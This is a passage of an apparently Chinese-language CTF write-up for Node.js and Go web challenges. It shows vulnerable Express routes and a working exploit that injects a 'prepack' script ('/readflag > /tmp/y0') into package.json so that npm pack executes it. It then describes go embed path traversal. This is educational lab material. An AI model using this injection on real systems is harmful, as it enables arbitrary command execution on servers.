(!req.<span class="property">session</span>.<span class="property">is_admin</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;You are not admin&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Packing dependencies...&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> filePath = path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public&quot;</span>);</span><br><span class="line">    cp.<span class="title function_">exec</span>(<span class="string">&quot;cd &quot;</span> + filePath + <span class="string">&quot;&amp;&amp; npm pack &amp;&amp; mv ./*.tgz ./packs&quot;</span>,<span class="function">(<span class="params">err,stdout,stderr</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;Pack dependencies error&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;Pack dependencies success&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Kill installing dependencies</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/KillDependencies&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_admin</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;You are not admin&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Killing dependencies...&quot;</span>);</span><br><span class="line">    cp.<span class="title function_">exec</span>(<span class="string">&quot;ps -ef | grep npm | grep -v grep | awk &#x27;&#123;print $2&#125;&#x27; | xargs kill -9&quot;</span>,<span class="function">(<span class="params">err,stdout,stderr</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (err)&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;Kill installing dependencies error&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;Kill installing dependencies success&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Logout</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/Logout&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">is_login</span> = <span class="number">0</span>;</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">is_admin</span> = <span class="number">0</span>;</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">user</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç„¶åå°±å¼€å§‹å®¡è®¡ä»£ç äº†ï¼Œå¯ä»¥çœ‹ç½‘é¡µä¸Šè·¯ç”±çš„ä»£ç äº† </p><p><code>// Set dependencies</code>è·¯ç”±</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">all</span>(<span class="string">&quot;/SetDependencies&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_admin</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&quot;You are not admin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;GET&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;You can post the dependencies here&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> data = req.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> data !== <span class="string">&quot;object&quot;</span> &amp;&amp; data === &#123;&#125;)&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;plz set the dependencies&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_">checkFileData</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data)))&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;Invalid dependencies&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> exampleJson = &#123;</span><br><span class="line">            <span class="string">&quot;name&quot;</span>: <span class="string">&quot;app-example&quot;</span>,</span><br><span class="line">            <span class="string">&quot;version&quot;</span>: <span class="string">&quot;1.0.0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;description&quot;</span>: <span class="string">&quot;Example app for the Node.js Getting Started guide.&quot;</span>,</span><br><span class="line">            <span class="string">&quot;author&quot;</span>: <span class="string">&quot;anonymous&quot;</span>,</span><br><span class="line">            <span class="string">&quot;scripts&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;prepack&quot;</span>: <span class="string">&quot;echo &#x27;packing dependencies&#x27;&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;license&quot;</span>: <span class="string">&quot;MIT&quot;</span>,</span><br><span class="line">            <span class="string">&quot;dependencies&quot;</span>: &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        exampleJson = <span class="title class_">Object</span>.<span class="title function_">assign</span>(exampleJson,&#123;&#125;,data);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> filePath = path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public/package.json&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> fileData = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(exampleJson);</span><br><span class="line"></span><br><span class="line">        fs.<span class="title function_">writeFile</span>(filePath,fileData,<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (err)&#123;</span><br><span class="line">                <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Set dependencies error&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;Set dependencies success&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œç”±äºè¿™ä¸ªpostå€¼å¯æ§ï¼Œäºæ˜¯dataå°±å¯æ§</p><p><img src="../images/image-20230504195748835.png" alt="image-20230504195748835"></p><p><img src="../images/image-20230504195839820.png" alt="image-20230504195839820"></p><p>è¿™æ®µä»£ç å®šä¹‰äº†ä¸€ä¸ª JavaScript å¯¹è±¡ <code>exampleJson</code>ï¼Œè¡¨ç¤ºä¸€ä¸ª Node.js åº”ç”¨ç¨‹åºçš„ <strong>package.json</strong> æ–‡ä»¶å†…å®¹ã€‚è¿™ä¸ªå¯¹è±¡åŒ…å«äº†åº”ç”¨ç¨‹åºçš„åç§°ã€ç‰ˆæœ¬ã€æè¿°ã€ä½œè€…ã€è„šæœ¬ã€è®¸å¯è¯å’Œä¾èµ–é¡¹ç­‰ä¿¡æ¯ã€‚</p><p><code>Object.assign</code> æ–¹æ³•ç”¨äºå°†æ–°çš„å±æ€§å€¼åˆå¹¶åˆ°ç°æœ‰å¯¹è±¡ä¸­ã€‚è¿™é‡Œï¼Œæˆ‘ä»¬å°†ç©ºå¯¹è±¡ <code>&#123;&#125;</code> ä½œä¸ºç¬¬äºŒä¸ªå‚æ•°ä¼ é€’ç»™ <code>Object.assign</code>ï¼Œå› æ­¤ä¸ä¼šä¿®æ”¹ç°æœ‰å¯¹è±¡ <code>exampleJson</code>ï¼Œè€Œæ˜¯è¿”å›ä¸€ä¸ªæ–°å¯¹è±¡ï¼Œè¯¥å¯¹è±¡åŒ…å« <code>exampleJson</code> çš„æ‰€æœ‰å±æ€§ä»¥åŠåœ¨ <code>data</code> å¯¹è±¡ä¸­å®šä¹‰çš„ä»»ä½•æ–°å±æ€§ã€‚</p><p>å¦‚æœ <code>data</code> å¯¹è±¡ä¸­å®šä¹‰äº†ä¸ <code>exampleJson</code> ä¸­ç›¸åŒçš„å±æ€§ï¼Œåˆ™å°†è¦†ç›–åŸæœ‰å±æ€§ã€‚å› æ­¤ï¼Œå¯ä»¥é€šè¿‡ <code>Object.assign</code> æ–¹æ³•æ¥ä¿®æ”¹æˆ–æ›´æ–°ç°æœ‰å¯¹è±¡çš„å±æ€§ã€‚<strong>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨ <code>Object.assign</code> æ¥å°† <code>data</code> å¯¹è±¡çš„å±æ€§å€¼åˆå¹¶åˆ° <code>exampleJson</code> å¯¹è±¡ä¸­ï¼Œå®ç°äº†æ›´æ–° package.json æ–‡ä»¶å†…å®¹çš„ç›®çš„ã€‚</strong></p><p><code>//PackDependencies</code>è·¯ç”±</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/PackDependencies&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_admin</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;You are not admin&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Packing dependencies...&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> filePath = path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public&quot;</span>);</span><br><span class="line">    cp.<span class="title function_">exec</span>(<span class="string">&quot;cd &quot;</span> + filePath + <span class="string">&quot;&amp;&amp; npm pack &amp;&amp; mv ./*.tgz ./packs&quot;</span>,<span class="function">(<span class="params">err,stdout,stderr</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;Pack dependencies error&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;Pack dependencies success&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œé¢çš„æœ‰ä¸ªæ‰§è¡Œå‡½æ•°ï¼Œä»–çš„æ„æ€æ˜¯</p><p><code>cp.exec(&quot;cd &quot; + filePath + &quot;&amp;&amp; npm pack &amp;&amp; mv ./*.tgz ./packs&quot;,(err,stdout,stderr) =&gt; &#123;</code> <code>npm pack</code>å°±ç›¸å½“ä¸é‡æ–°åŠ è½½é‡Œé¢çš„jsonæ•°æ®ä¼šå˜æˆæˆ‘ä»¬æ”¹å˜è¿‡çš„ï¼Œç„¶åexecæ‰§è¡Œ</p><p><img src="../images/image-20230504200640051.png" alt="image-20230504200640051"></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ä¸´æ—¶æ–‡ä»¶æ¥æ›¿æ¢è¿™ä¸ªä»£ç ï¼Œå› ä¸ºä¸´æ—¶ç›®å½•ä¸‹æ–‡ä»¶æƒé™è¾ƒé«˜</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> exampleJson = </span><br><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;name&quot;</span>: <span class="string">&quot;app-example&quot;</span>,</span><br><span class="line"><span class="string">&quot;version&quot;</span>: <span class="string">&quot;1.0.0&quot;</span>,</span><br><span class="line"><span class="string">&quot;description&quot;</span>: <span class="string">&quot;Example app for the Node.js Getting Started guide.&quot;</span>,</span><br><span class="line"><span class="string">&quot;author&quot;</span>: <span class="string">&quot;anonymous&quot;</span>,</span><br><span class="line"><span class="string">&quot;scripts&quot;</span>:&#123;</span><br><span class="line"><span class="string">&quot;prepack&quot;</span>: <span class="string">&quot;/readflag &gt; /tmp/y0&quot;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="string">&quot;license&quot;</span>: <span class="string">&quot;MIT&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åæœ€åé€šè¿‡showè·¯ç”±å°±å¯ä»¥æˆåŠŸè¿›è¡Œæ–‡ä»¶æŸ¥çœ‹äº†</p><p><img src="../images/image-20230504201002030.png" alt="image-20230504201002030"></p><p>å…ˆå»  <code>url/dashboardIndex/SetDependencies</code>  è¿™ä¸ªç½‘å€æ¥è¿›è¡Œ<strong>package.json</strong>å†…å®¹çš„ä¿®æ”¹</p><p><img src="../images/image-20230504205510103.png" alt="image-20230504205510103"></p><p><strong>è¿™é‡Œæ˜¯åˆ«å¿˜æ”¹äº†ï¼Œä¸ç„¶ä¸Šä¼ ä¸æˆåŠŸ</strong></p><p>ç„¶åå»<code>url/dashboardIndex/PackDependencies</code>è·¯ç”±è¿›è¡Œnpm pack é‡æ–°åŠ è½½jsonæ•°æ®ï¼Œç„¶åè¿›è¡Œexecæ•°æ®çš„æ‰§è¡Œ</p><p><img src="../images/image-20230504202007954.png" alt="image-20230504202007954"></p><p>ç„¶åå»<code>url/dashboardIndex/ShowExampleFile</code>è·¯ç”±è¿›è¡Œæ–‡ä»¶çš„è¯»å–</p><p><img src="../images/image-20230504205542586.png" alt="image-20230504205542586"></p><p>æˆåŠŸ</p><p><strong>è¿™é‡Œè€ƒå¯Ÿçš„nosqlçš„MongoDBç›²æ³¨ï¼Œappé»‘åå•ç»•è¿‡ï¼Œnodejsä»£ç å®¡è®¡ï¼Œnpm packçš„é‡æ–°åŠ è½½</strong></p><p>è¿™é“é¢˜èƒ½å­¦åˆ°æŒºå¤šä¸œè¥¿çš„</p><h2 id="d3go"><a href="#d3go" class="headerlink" title="d3go"></a>d3go</h2><p><strong>bsæ˜¯goç¼–ç¨‹è¯­è¨€çš„æ–°æ‰‹ï¼Œæœ€è¿‘å‘ç°æ–°ç‰¹æ€§â€œgo embedâ€å¾ˆæœ‰æ„æ€ã€‚ä»–å†™äº†ä¸€ä¸ªåœ¨çº¿è§£å‹æœåŠ¡ï¼Œä½¿ç”¨go embedæ‰“åŒ…é™æ€èµ„æºæ–‡ä»¶ã€‚æ‚¨çš„ä»»åŠ¡æ˜¯åˆ©ç”¨æ­¤åº”ç”¨ç¨‹åºçš„æ¼æ´ï¼Œå¯¹å…¶è¿›è¡Œ RCE å¹¶è·å–æ ‡å¿—ã€‚</strong></p><p><strong>ä¸€å¼€å§‹ä¼šæ˜¾ç¤ºERR_EMPTY_RESPONSEï¼Œè¯·ç¨å€™åˆ·æ–°ï¼</strong></p><p><strong>æç¤ºï¼š</strong></p><p><strong>d3go çš„Gamebox æ— æ³•è¿æ¥åˆ°Internetã€‚</strong></p><p>é¢˜ç›®</p><p><img src="../images/image-20230505192100368.png" alt="image-20230505192100368"></p><p><code>go embed</code> çš„é”™è¯¯ä½¿ç”¨å¯¼è‡´æºä»£ç è¢«æ‰“åŒ…åˆ°ç¨‹åºä¸­ã€‚</p><p>è¿™ä¸ä¸æ­£ç¡®çš„é™æ€æ–‡ä»¶æœåŠ¡ç›¸ç»“åˆï¼Œå¯¼è‡´/../è·¯å¾„åˆ—è¡¨â½¬å½•ä»¥è·å–æºä»£ç ã€‚</p><p><img src="../images/image-20230505192841822.png" alt="image-20230505192841822"></p><p><strong>main.go</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;crypto/rand&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/config&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/controller&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/db&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/middleware&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-contrib/sessions&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-contrib/sessions/cookie&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/jpillora/overseer&quot;</span></span><br><span class="line">log <span class="string">&quot;github.com/sirupsen/logrus&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">prog</span><span class="params">(state overseer.State)</span></span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">InitRouter(r)</span><br><span class="line">server := http.Server&#123;</span><br><span class="line">Addr:    <span class="string">&quot;:8080&quot;</span>,</span><br><span class="line">Handler: r,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> err := server.Serve(state.Listener); err != <span class="literal">nil</span> &amp;&amp; err != http.ErrServerClosed &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line">&lt;-state.GracefulShutdown</span><br><span class="line"><span class="keyword">if</span> err := server.Shutdown(<span class="literal">nil</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">config.Init()</span><br><span class="line">db.Init()</span><br><span class="line"><span class="keyword">if</span> config.Conf.AutoUpdate &#123;</span><br><span class="line">log.Printf(<span class="string">&quot;Auto update enabled&quot;</span>)</span><br><span class="line">err := overseer.RunErr(overseer.Config&#123;</span><br><span class="line">Program: prog,</span><br><span class="line">Address: <span class="string">&quot;:8080&quot;</span>,</span><br><span class="line">Fetcher: &amp;config.Fetch,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">InitRouter(r)</span><br><span class="line"><span class="keyword">if</span> err := r.Run(<span class="string">&quot;:8080&quot;</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">InitRouter</span><span class="params">(r *gin.Engine)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> rad [<span class="number">32</span>]<span class="type">byte</span></span><br><span class="line">rand.Read(rad[:])</span><br><span class="line">store := cookie.NewStore(rad[:])</span><br><span class="line">r.Use(sessions.Sessions(<span class="string">&quot;mysession&quot;</span>, store))</span><br><span class="line">r.POST(<span class="string">&quot;/login&quot;</span>, controller.Login)</span><br><span class="line">r.POST(<span class="string">&quot;/register&quot;</span>, controller.Register)</span><br><span class="line">r.GET(<span class="string">&quot;/*filepath&quot;</span>, ServeFile)</span><br><span class="line">r.HEAD(<span class="string">&quot;/*filepath&quot;</span>, ServeFile)</span><br><span class="line">admin := r.Group(<span class="string">&quot;/admin&quot;</span>)</span><br><span class="line">admin.Use(middleware.Auth())</span><br><span class="line">admin.POST(<span class="string">&quot;/upload&quot;</span>, controller.Upload)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ServeFile</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="comment">// unzipped file server</span></span><br><span class="line">p := c.Param(<span class="string">&quot;filepath&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> strings.HasPrefix(p, <span class="string">&quot;/unzipped&quot;</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(p) == <span class="number">9</span> &#123;</span><br><span class="line">p = <span class="string">&quot;/&quot;</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">p = p[<span class="number">9</span>:]</span><br><span class="line">&#125;</span><br><span class="line">c.FileFromFS(p, http.Dir(<span class="string">&quot;./unzipped&quot;</span>))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// embed static file server</span></span><br><span class="line">p = <span class="string">&quot;/static/&quot;</span> + c.Param(<span class="string">&quot;filepath&quot;</span>)</span><br><span class="line">c.FileFromFS(p, http.FS(Static))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>config.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 